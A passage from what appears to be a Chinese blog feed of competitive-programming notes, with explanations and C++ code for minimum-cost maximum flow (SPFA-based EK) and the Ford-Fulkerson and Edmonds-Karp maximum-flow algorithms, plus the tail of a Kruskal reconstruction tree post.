class="line">            <span class="keyword">if</span>(x == las)<span class="keyword">break</span>;</span><br><span class="line">            now = value[x] + k;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;now&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//完结撒花</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序注释提到了，咱因为数组越界查了两个小时的错误，硬生生没看到LCA没有开两倍的内存。</p><p><img src="/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/5.png" alt="5"></p><p>又一图论算法收入囊中，挺开心的。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> Kruskal重构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>最小费用最大流笔记</title>
      <link href="/2022/03/05/%E6%9C%80%E5%B0%8F%E8%B4%B9%E7%94%A8%E6%9C%80%E5%A4%A7%E6%B5%81%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/03/05/%E6%9C%80%E5%B0%8F%E8%B4%B9%E7%94%A8%E6%9C%80%E5%A4%A7%E6%B5%81%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>时隔多日，又一模板收入其中：最小费用最大流。</p><span id="more"></span><h2 id="概念引入"><a href="#概念引入" class="headerlink" title="概念引入"></a>概念引入</h2><ul><li>费用：对每条有向边新增的一个属性，费用表示每个经过这条边的一个单位流量将会添加这么多费用。</li></ul><p>将抽象的问题具象化：在一张高速网中有 $n$ 个收费站，$m$ 条单向通行的道路，每走完一条道路就会到那边的收费站收费，收费价格会根据你走的哪条路收费，而不是固定的收费点就收固定的钱，这个也很合逻辑吧。然后一条道路最多同行 $w$ 辆车，也就是说这条路一旦走过超过 $w$ 辆车那这条路将不再放行，虽然不符合我们的认知但是他就这么规定了你也没办法嘛对吧。在 $n$ 个收费站有一个源收费站一个目的收费站，问最多有多少辆车能从源收费站到目的收费站，总费用最小的通行方案是多少。</p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>乍一听好像没啥思路，但是从一个司机的角度去考虑，这就会变得简单了，因为对于一个司机来说，我的目标是到达目的收费站且使我花费最少。那么起点终点确定了，每条路收费确定了，收费站之间的道路也确定了，那么我以收费为边权计算我到终点的单源最短路不就可以了么，走单源最短路一定会使得我的花费最少，因为边权是费用，最短在某种意义上就是费用最少啦。</p><p> 但是我们是不可能为每一个司机考虑的，我们可以搜出一条单源最短路，那么就很容易计算这条路上的总费用和最小流量。那么这一次我就相当于通过了，<strong>最小流量</strong> 辆车，费用相当于多了 <strong>最小流量$\times$ 总费用</strong> 。这里就跟网络流有点类似了，我求单源最短路的过程也可以视为找一条增广路。在结果保存之后我们依然要添加反向边，然后对应流量减少，反向边流量增加。但是这里我们还需要注意这个反向边费用是多少呢？其实很好理解，我一辆车过去，再回来，对车来说相当于没过去，也就没有花费<del>虽然实际情况不是这样</del>，所以我们添加反向边的时候要给路径长度为负边权。这样就决定了我们只能考虑某已死算法，虽然你可以给所有边权加上一个最大值使得每个边权为正，最后跑完 $\text{dijkstra}$ 之后再每条边减去这么多。但是实际我写出来并不行，也不知道为什么，但是听说网络流有不成文的规定：</p><p>有以下情况之一的：</p><ol><li>网络流卡 $\text{Dinic}$ 算法。</li><li>费用流卡 $\text{spfa}$ 算法。</li></ol><p>按照规定其族谱将被万人问候。</p><p>最后一点需要注意：一条边流量为 $0$ 之后，它应被视为断开。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><p>模板题：<a href="https://www.luogu.com.cn/problem/P3381">P3381</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inf 0x3f3f3f3f3f3f3f3f</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; P;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">int</span> d;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ppp</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line">    <span class="keyword">int</span> edge;</span><br><span class="line">&#125;pre[maxn];</span><br><span class="line"><span class="keyword">int</span> s,t,ans,n,m,cnt;</span><br><span class="line"><span class="keyword">int</span> root[maxn],dis[maxn],inque[maxn],vis[maxn];</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w,<span class="keyword">int</span> d)</span></span>&#123;</span><br><span class="line">    edge[++cnt]=&#123;y,w,d,root[x]&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">spfa</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dis));<span class="comment">//最大初始化</span></span><br><span class="line">    dis[s]=<span class="number">0</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(s);<span class="comment">//源点入队</span></span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        inque[u]=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;u&lt;&lt;endl;</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">            <span class="keyword">if</span>(!edge[i].w)<span class="keyword">continue</span>;<span class="comment">//如果这条边没有流量则跳过</span></span><br><span class="line">            <span class="keyword">if</span>(dis[v]&gt;dis[u]+edge[i].d)&#123;<span class="comment">//三角形不等式判定</span></span><br><span class="line">                dis[v]=dis[u]+edge[i].d;</span><br><span class="line">                pre[v].v=u;<span class="comment">//记录路径</span></span><br><span class="line">                pre[v].edge=i;</span><br><span class="line">                <span class="keyword">if</span>(!inque[v])&#123;<span class="comment">//经典spfa</span></span><br><span class="line">                    inque[v]=<span class="number">1</span>;</span><br><span class="line">                    q.<span class="built_in">push</span>(v);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dis[t]!=inf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EK</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>,w=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">spfa</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> k=inf;</span><br><span class="line">        <span class="keyword">int</span> f=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=t;i!=s;i=pre[i].v)&#123;</span><br><span class="line">            k=<span class="built_in">min</span>(edge[pre[i].edge].w,k);<span class="comment">//计算最小流量</span></span><br><span class="line">            f+=edge[pre[i].edge].d; <span class="comment">//统计总费用</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=t;i!=s;i=pre[i].v)&#123;</span><br><span class="line">            edge[pre[i].edge].w-=k;<span class="comment">//正向边流量-</span></span><br><span class="line">            edge[pre[i].edge^<span class="number">1</span>].w+=k;<span class="comment">//反向边流量+</span></span><br><span class="line">        &#125;</span><br><span class="line">        ans+=k;<span class="comment">//计算流量</span></span><br><span class="line">        w+=k*f;<span class="comment">//计算费用</span></span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;<span class="string">&#x27; &#x27;</span>&lt;&lt;w&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P3381_8.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cnt=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;s&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="keyword">int</span> u,v,w,c;</span><br><span class="line">        cin&gt;&gt;u&gt;&gt;v&gt;&gt;w&gt;&gt;c;</span><br><span class="line">        <span class="built_in">add</span>(u,v,w,c);</span><br><span class="line">        <span class="built_in">add</span>(v,u,<span class="number">0</span>,-c);<span class="comment">//添加负费用的反向边</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">EK</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 网络流 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络流学习笔记</title>
      <link href="/2022/03/03/%E7%BD%91%E7%BB%9C%E6%B5%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/03/03/%E7%BD%91%E7%BB%9C%E6%B5%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>最近花点时间看了看网络流，也深度地学习了一下网络流的各个算法，虽然还有一个没学，但是不影响。</p><span id="more"></span><h2 id="概念引入"><a href="#概念引入" class="headerlink" title="概念引入"></a>概念引入</h2><p>首先我们要先理解一下什么是网络，网络与有向图虽然长得一模一样，但是概念略微不一样，首先网络的边权不代表路径长度，代表流量或者花费。</p><ol><li>源点：入读为0的点，只出不进</li><li>汇点：出度为0的点，只进不出</li></ol><p>在网络中，对于非源点和汇点的所有点，需要满足流入流量之和等于流出流量之和，中间节点不存储任何流量，任何一条边的流量受限于自己的容量限制。</p><p>于是有的人就想要求出：这张网络运作起来的时候，总流量最大能有多少。由于容量限制比较复杂，似乎不容易规划一个最佳方案。</p><p>such as:</p><p><img src="/2022/03/03/%E7%BD%91%E7%BB%9C%E6%B5%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1.png" alt="1"></p><p>在这里，很容易得出 $s\to t$ 的最大流量就是2，上面一条路，下面一条路，边上的限制都是1，因此总流量为2。这里我们再给出两个概念：</p><ol><li>增广 :在现有流量基础上发现新的路径,扩大发现的最大流量(<strong>注意</strong>:增加量不一定是这条路径的流量,而是新的流量与上次流量之差)</li><li>增广路:在现有流量基础上发现的新路径.(快来找茬,和上一条有何不同?)</li></ol><p>因此我们有了第一个算法：FF。</p><p>虽然一般来说基本通不过测试点，但是还是有必要学的。</p><h2 id="FF算法"><a href="#FF算法" class="headerlink" title="FF算法"></a>FF算法</h2><p>从源点开始寻找增广路，如过找到那么整条路径的流量减去整个路径上的最小流量，然后重复寻找增广路，直到找不到增广路为止，最大流即是每次增广路减少的流量的和，这个结论是很容易证明的，所以咱就不证了。</p><p>很有幸，咱还是写过了这个算法，每次 $\text{dfs}$ 得到一个增广路，这个算法过得了图为树时候的最大流，但是过不去标板，标板的数据量才200个点，还能 TLE 很多点。</p><p>但是有一个问题，如果我一开始走了错误的路线，比如上面的图中，假如我走了中间那条路，那么就会导致接下来找不到增广路了，所以我们在走的时候会增加反悔功能，这条反向边就是防止走了错误路线给你反悔用的，假设你走了 $s\to a \to b\to t$ ，那么此时图变成这样：</p><p><img src="/2022/03/03/%E7%BD%91%E7%BB%9C%E6%B5%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2.png" alt="2"></p><p>那么在往下走的过程中我就能经过 $s \to b\to a\to t$，然后到达汇点。中间这条边经过两次，变回一开始的样子，相当于就是没走，这个反向边添加在所有的网络流算法都会用到，因此一定要理解。</p><p>这里给出练习这个算法的板子吧——<a href="https://www.luogu.com.cn/problem/P3931">P3931</a></p><p>我写的程序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> r,n,cnt=<span class="number">1</span>,root[maxn],fa[maxn],dest[maxn];</span><br><span class="line">stack&lt;<span class="keyword">int</span>&gt;path;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt]=&#123;root[x],y,w&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(fa[u]==to)<span class="keyword">continue</span>;</span><br><span class="line">        fa[to]=u;</span><br><span class="line">        <span class="comment">//edge[i^1].w=0;</span></span><br><span class="line">        <span class="built_in">dfs</span>(to);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!edge[root[u]].next&amp;&amp;u!=r)&#123;</span><br><span class="line">        dest[u]=<span class="number">1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_path</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> from,<span class="keyword">int</span> flow)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(dest[now])<span class="keyword">return</span> flow;</span><br><span class="line">    <span class="keyword">int</span> qw=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[now];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> to=edge[i].to,w=edge[i].w;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//printf(&quot;to is %d w is %d\n&quot;,to,w);</span></span><br><span class="line">        <span class="keyword">if</span>(to==from)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(w==<span class="number">0</span>)<span class="keyword">continue</span>;</span><br><span class="line">        path.<span class="built_in">push</span>(i);</span><br><span class="line">        qw=<span class="built_in">find_path</span>(to,now,<span class="built_in">min</span>(flow,w));</span><br><span class="line">        <span class="keyword">if</span>(qw==<span class="number">0</span>)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> qw;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">maxflow</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> l=<span class="built_in">find_path</span>(r,<span class="number">0</span>,<span class="number">0x7fffffff</span>);</span><br><span class="line">        <span class="keyword">if</span>(l!=<span class="number">0</span>&amp;&amp;l!=<span class="number">0x7fffffff</span>)&#123;</span><br><span class="line">            ans+=l;</span><br><span class="line">            <span class="keyword">while</span>(path.<span class="built_in">size</span>())&#123;</span><br><span class="line">                <span class="keyword">int</span> e=path.<span class="built_in">top</span>();</span><br><span class="line">                path.<span class="built_in">pop</span>();</span><br><span class="line">                edge[e].w-=l;</span><br><span class="line">                edge[e^<span class="number">1</span>].w+=l; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//printf(&quot;ans=%d\n&quot;,ans);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P3931_2.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    cin&gt;&gt;n&gt;&gt;r;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w);</span><br><span class="line">        <span class="built_in">add</span>(y,x,w);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">dfs</span>(r);</span><br><span class="line">    <span class="built_in">maxflow</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个数据量 $\text{10w}$ 都能过为啥能过呢，据评论区大佬说，因为树是二分图，因此增广路不会超过 $log_2n$ 条，因此这题我这么写能过，但是遇到非树的毒瘤图那真的 $200$ 都能卡住的，而且我下了一下标板的测试点，貌似就是会陷入死循环，我不知道哪里写出来的问题了。</p><h2 id="EK算法"><a href="#EK算法" class="headerlink" title="EK算法"></a>EK算法</h2><p>在高中的时候我们老师就讲过，在一般情况下，$\text{dfs}$ 一定是没有 $\text{bfs}$ 优的。因此我们每次都挑一个看上去路径最短的增广路，既然要求最短了我们就可以用 $\text{bfs}$ 去寻找增广路了。</p><p>EK算法可以通过标板——<a href="https://www.luogu.com.cn/problem/P3376">P3376</a></p><p>我写的程序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 500</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inf 0x3f3f3f3f3f3f3f3f</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[<span class="number">5005</span>&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> v;</span><br><span class="line">    <span class="keyword">int</span> edge;</span><br><span class="line">&#125;pre[<span class="number">5005</span>&lt;&lt;<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> root[maxn],inque[maxn],cnt=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,s,t;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt]=&#123;y,w,root[x]&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bfs</span><span class="params">()</span></span>&#123;</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line">    <span class="built_in">memset</span>(inque,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(inque));</span><br><span class="line">    <span class="built_in">memset</span>(pre,<span class="number">0xff</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(pre));</span><br><span class="line">    inque[s]=<span class="number">1</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(s);</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">            <span class="keyword">if</span>(!inque[v]&amp;&amp;edge[i].w)&#123;</span><br><span class="line">                pre[v]=&#123;u,i&#125;;</span><br><span class="line">                <span class="keyword">if</span>(v==t)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125; </span><br><span class="line">                inque[v]=<span class="number">1</span>;</span><br><span class="line">                q.<span class="built_in">push</span>(v);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EK</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;%lld\n&quot;,sizeof(ans));</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">bfs</span>())&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> mi=inf;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=t;i!=s;i=pre[i].v)&#123;</span><br><span class="line">            mi=<span class="built_in">min</span>(mi,edge[pre[i].edge].w);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=t;i!=s;i=pre[i].v)&#123;</span><br><span class="line">            edge[pre[i].edge].w-=mi;</span><br><span class="line">            edge[pre[i].edge^<span class="number">1</span>].w+=mi;</span><br><span class="line">        &#125;</span><br><span class="line">        ans+=mi;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span 